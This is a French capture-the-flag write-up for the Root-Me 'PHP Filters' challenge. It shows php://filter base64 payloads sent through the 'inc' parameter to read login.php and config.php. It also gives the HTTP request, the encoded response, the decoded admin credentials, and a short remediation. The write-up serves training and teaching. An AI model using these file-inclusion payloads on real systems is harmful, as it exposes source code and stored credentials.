# Challenge 2 : PHP Filters

**URL** : https://www.root-me.org/fr/Challenges/Web-Serveur/PHP-Filters

## Exploitation

Parametre vulnerable: `inc`

### Etape 1: Lire login.php

Payload:
```
php://filter/convert.base64-encode/resource=login.php
```

Resultat decode montre que config.php contient les identifiants.

### Etape 2: Lire config.php

Payload:
```
php://filter/convert.base64-encode/resource=config.php
```

Requete:
```
GET /?inc=php://filter/convert.base64-encode/resource=config.php HTTP/1.1
Host: challenge01.root-me.org
```

Base64 retourne:
```
PD9waHAKJHVzZXJuYW1lPSJhZG1pbiI7CiRwYXNzd29yZD0iREFQdDlEMm1reTBBUEFGIjsK
```

Decode:
```php
<?php
$username="admin";
$password="DAPt9D2mky0APAF";
```

## Explication

- `php://filter` wrapper PHP pour lire les fichiers
- `convert.base64-encode` encode pour voir le code source
- `resource=fichier.php` cible a lire

## Correction

Utiliser whitelist de pages. Desactiver allow_url_include.
